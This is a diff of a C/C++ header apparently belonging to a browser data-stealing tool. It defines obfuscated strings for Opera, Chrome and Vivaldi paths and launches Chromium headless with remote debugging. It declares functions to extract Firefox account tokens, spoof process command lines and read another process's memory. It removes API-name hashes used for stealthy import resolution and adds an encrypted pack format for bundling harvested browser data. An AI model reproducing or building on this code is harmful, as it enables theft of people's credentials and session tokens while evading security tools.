@@ -24,8 +24,8 @@
 #define STR_OPERA_REGKEY                OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera.exe")
 #define STR_OPERA_OUTPUT_FILE           OBFA_S("OperaData.json")
 
-#define STR_OPERA_GX_PROGID             OBFW_S(L"OperaGXStable")
-#define STR_OPERA_GX_REGKEY             OBFW_S(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\Opera_GX.exe")
+#define STR_OPERA_GX_PROGID             OBFW_S(L"Opera GXStable")
+#define STR_OPERA_GX_REGKEY             STR_OPERA_REGKEY
 #define STR_OPERA_GX_OUTPUT_FILE        OBFA_S("OperaGxData.json")
 
 #define STR_CHROME_PROGID               OBFW_S(L"ChromeHTML")
@@ -45,6 +45,8 @@
 #define STR_VIVALDI_OUTPUT_FILE         OBFA_S("VivaldiData.json")
 
 #define STR_CHROMIUM_ARGS               OBFW_S(L"--headless=new --disable-gpu --remote-debugging-port=9222 --disable-background-timer-throttling")
+
+#define STR_ENC_JSON_PACK_FORMAT        OBFA_S("EncPack-%02d-%02d-%02d-%02d%02d%02d.bin")
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -228,19 +230,23 @@ typedef struct _CHROMIUM_DATA
 
 } CHROMIUM_DATA, *PCHROMIUM_DATA;
 
-
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-DWORD WINAPI HashStringFnv1aCharA(IN LPCSTR pszString, IN BOOL bCaseInsensitive);
-DWORD WINAPI HashStringFnv1aCharW(IN LPCWSTR pwszString, IN BOOL bCaseInsensitive);
+typedef struct _ENCRYPTED_JSON_PACK
+{
+    HANDLE  hOutputFile;
+    BYTE    Signature[BUFFER_SIZE_08];
+    DWORD   dwSignatureLen;
+    DWORD   dwEntryCount;
+    CHAR    szOutputPath[MAX_PATH]; // For display purposes
+} ENCRYPTED_JSON_PACK, *PENCRYPTED_JSON_PACK;
 
 
-#define HASH_STRING_A(STR)       HashStringFnv1aCharA((LPCSTR)(STR), FALSE)
-#define HASH_STRING_W(STR)       HashStringFnv1aCharW((LPCWSTR)(STR), FALSE)
+BOOL InitEncryptedJsonPack(OUT PENCRYPTED_JSON_PACK pPack, IN PBYTE pbSignature, IN DWORD dwSignatureLen);
 
-#define HASH_STRING_A_CI(STR)    HashStringFnv1aCharA((LPCSTR)(STR), TRUE)
-#define HASH_STRING_W_CI(STR)    HashStringFnv1aCharW((LPCWSTR)(STR), TRUE)
+BOOL EncryptAndAddJsonEntry(IN PENCRYPTED_JSON_PACK pPack, IN LPCSTR pszFilename, IN PBYTE pbData, IN DWORD dwDataLen);
 
+VOID CloseEncryptedJsonPack(IN PENCRYPTED_JSON_PACK pPack);
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 // Utilities Functions
@@ -248,6 +254,8 @@ DWORD WINAPI HashStringFnv1aCharW(IN LPCWSTR pwszString, IN BOOL bCaseInsensitiv
 VOID RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN LPWSTR SourceString);
 
 LPWSTR GenerateFakeCommandLine(IN LPCWSTR szRealCommandLine, IN LPCWSTR szProcessPath);
+
+BOOL GenerateRandomBytes(OUT PBYTE pbBuffer, IN DWORD dwLength);
 
 BOOL NtReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID pBuffer, IN SIZE_T cbSize);
 
@@ -338,32 +346,11 @@ BOOL ExtractFirefoxAccountTokens(IN OUT PFIREFOX_BROWSER_DATA pFirefoxData);
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN BOOL bShowAll);
+BOOL WriteChromiumDataToJson(IN PCHROMIUM_DATA pChromiumData, IN LPCSTR pszFilePath, IN DWORD dwMaxEntries);
 
-// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
+BOOL WriteChromiumDataToEncJsonPack(IN PCHROMIUM_DATA pChromiumData, IN PENCRYPTED_JSON_PACK pPack, IN LPCSTR pszFilename, IN DWORD dwMaxEntries);
 
-#pragma region HASH_VALUES
-
-#define FNV1A_KERNEL32DLL                                    0xA3E6F6C3
-#define FNV1A_NTDLLDLL                                       0xA62A3B3B
-
-#define FNV1A_BASEPCONSTRUCTSXSCREATEPROCESSMESSAGE          0x98A84DB3
-#define FNV1A_CSRCAPTUREMESSAGEMULTIUNICODESTRINGSINPLACE    0x58CC175A
-#define FNV1A_CSRCLIENTCALLSERVER                            0x33C69D47
-#define FNV1A_NTCREATEUSERPROCESS                            0x116893E9
-#define FNV1A_RTLCREATEPROCESSPARAMETERSEX                   0x2DFC830F
-#define FNV1A_RTLDESTROYPROCESSPARAMETERS                    0x552E48C2
-#define FNV1A_NTCREATEDEBUGOBJECT                            0x22074A55
-#define FNV1A_NTWAITFORDEBUGEVENT                            0xEECD8408
-#define FNV1A_NTDEBUGCONTINUE                                0xED5F89F7
-#define FNV1A_NTREMOVEPROCESSDEBUG                           0x81FB52CF
-#define FNV1A_NTQUERYINFORMATIONPROCESS                      0xEA2DDA8A
-#define FNV1A_NTREADVIRTUALMEMORY                            0x6E2A0391
-#define FNV1A_NTWRITEVIRTUALMEMORY                           0x43E32F32
-#define FNV1A_NTOPENPROCESSTOKEN                             0x1F1A92AD
-
-
-#pragma endregion
+BOOL DecryptJsonPack(IN LPCSTR pszInputFile, IN PBYTE pbSignature, IN DWORD dwSignatureLen);
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
@@ -500,10 +487,11 @@ typedef NTSTATUS(NTAPI* fnNtOpenProcessToken)(
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-typedef struct _DINMCLY_RSOLVD_FUNCTIONS
-{
-    PVOID                                           pInitialized;
+// EXE-only dynamically resolved function pointers.
+// Inherits from SHARED_RSOLVD_FUNCTIONS so all shared members 
 
+typedef struct _DINMCLY_RSOLVD_FUNCTIONS : SHARED_RSOLVD_FUNCTIONS
+{
     // NTAPI Functions
     fnNtCreateUserProcess                           pNtCreateUserProcess;
     fnRtlCreateProcessParametersEx                  pRtlCreateProcessParametersEx;
@@ -522,14 +510,17 @@ typedef struct _DINMCLY_RSOLVD_FUNCTIONS
     fnCsrCaptureMessageMultiUnicodeStringsInPlace   pCsrCaptureMessageMultiUnicodeStringsInPlace;
     fnCsrClientCallServer                           pCsrClientCallServer;
 
-
+    // Advapi32 Functions
+    decltype(&RegOpenKeyExW)                         pRegOpenKeyExW;
+    decltype(&RegCloseKey)                           pRegCloseKey;
+    decltype(&RegQueryValueExW)                      pRegQueryValueExW;
+   
 } DINMCLY_RSOLVD_FUNCTIONS, *PDINMCLY_RSOLVD_FUNCTIONS;
 
 
 // ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
 
-BOOL InitializeAllDynamicFunctions();
 
 
 
